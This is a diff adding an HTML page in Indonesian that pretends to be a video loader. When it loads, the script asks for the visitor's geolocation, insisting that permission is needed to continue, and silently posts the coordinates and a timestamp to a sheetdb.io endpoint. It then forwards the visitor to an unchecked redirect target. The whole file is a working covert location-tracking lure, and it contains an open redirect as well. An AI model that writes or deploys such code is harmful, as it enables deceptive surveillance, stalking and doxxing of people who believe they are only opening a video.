@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Memuat video...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <p>Sedang memuat video...</p>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const redirectTo = params.get("redirect");
+
+    function kirimLokasi(lat, lon) {
+      fetch("https://sheetdb.io/api/v1/o9j0j7jywk5lc", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          data: {
+            latitude: lat,
+            longitude: lon,
+            waktu: new Date().toISOString()
+          }
+        })
+      });
+    }
+
+    function mulaiLacak() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          kirimLokasi(lat, lon);
+
+          // Redirect ke video asli setelah lokasi dikirim
+          if (redirectTo) {
+            window.location.href = decodeURIComponent(redirectTo);
+          } else {
+            document.body.innerHTML = "Gagal memuat video.";
+          }
+        }, function(error) {
+          alert("Izin lokasi dibutuhkan untuk melanjutkan.");
+        });
+      } else {
+        alert("Browser tidak mendukung geolokasi.");
+      }
+    }
+
+    // Mulai proses
+    mulaiLacak();
+  </script>
+</body>
+</html>
